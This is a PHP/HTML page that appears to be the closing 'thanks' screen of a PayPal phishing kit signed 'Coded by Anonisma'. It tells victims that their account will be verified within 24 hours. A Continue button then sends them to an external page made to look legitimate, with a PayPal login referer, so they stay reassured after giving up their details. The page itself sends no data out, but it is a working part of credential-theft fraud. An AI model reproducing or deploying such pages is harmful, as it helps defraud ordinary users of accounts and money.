<?php

require_once 'hostname.php';


  session_start();



?>


    <html>
        <head>
            
            <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"></meta>
            <title>

                  Thanks, your account... 

            </title>
            <link href="img/icon.png" rel="shortcut icon"/>
			<link href="css/secure1.css" rel="stylesheet"></link>
			<link href="css/secure2.css" rel="stylesheet"></link>
            <!--

            Coded by Anonisma

            -->
        </head>
        <body>
            <div id="page" class="Anonisma">
                <header class="gblHeader">
                    <div class="utility in">
                        <div class="wrapper">
                            <div class="logo" role="banner">
                                <a href="thanks.html">
                                    <img src="img/secure/logo_que haces_106x29.png" alt="img "></img>
                                </a>
                            </div>
                        </div>
                    </div>
                </header>
                <br></br>
                <section id="content" class="" tabindex="-1">
                    <section id="main" role="main">
                        <br></br>
                        <center>
                            <a href="thanks.html">
                                <img src="img/thanks/th.png"></img>
                            </a>
                        </center>
                        <br></br>
                        <br></br>
                        <div class="nsb_10_14">
                            <div class="one column authTray">
                                <div class="trayNavOuter">
                                    <div class="trayNavInner">
                                        <section id="entry">
                                            <header>
                                                <img src="./img/thanks/correcto.png"></img>
                                                <p>

                                                     Your account will be verified in the next 24 hours.

                                                </p>
                                                <br></br>
                                            </header>
                                            <div>
                                                <div class="selectDropdown">
                                                    <br></br>
                                                    <img src="./img/thanks/chokkisma.png"></img>
                                                    <div class="buttons">
                                                        <input value="Continue" class="button" onclick=" window.location.href='https://secure.opinionlab.com/ccc01/comment_card.asp?time1=1402969318872&amp;time2=1402969372567&amp;prev=&amp;referer=https:%2F%2FUS%2Epaypal%2Ecom%2Fen_US%2F00%2FLog_In%2Epage&amp;height=768&amp;width=1366&amp;custom_var=kx3fhVVgW8gMa0n7M3NIPcBg7XZ2KBu2BcI5nN2fD2%252fd%252ffvYhBp7rQ%253d%253d_146aca2e3e4|Unknown|Log%20In|US|en_US|Unknown|Unknown|Unknown|Unknown'" type="submit">
                                                    </div>
                                                    <div class="footer mini">
                                                    </div>
                                                </div>
                                            </div>
                                        </section>
                                    </div>
                                </div>
                            </div>
                            <span style="position: absolute; top: 50 px; left: 100 px;width: 50px; height: 10px">
                                <a href="thanks.html">
                                    <img src="./img/thanks/anonis.png"></img>
                                </a>
                            </span>
                        </div>
                        <footer>
                            <center>
                                <a href="thanks.html">
                                    <img src="./img/secure/footer1.png"></img>
                                </a>
                            </center>
                        </footer>
                    </section>
                </section>
            </div>
        </body>
    </html>

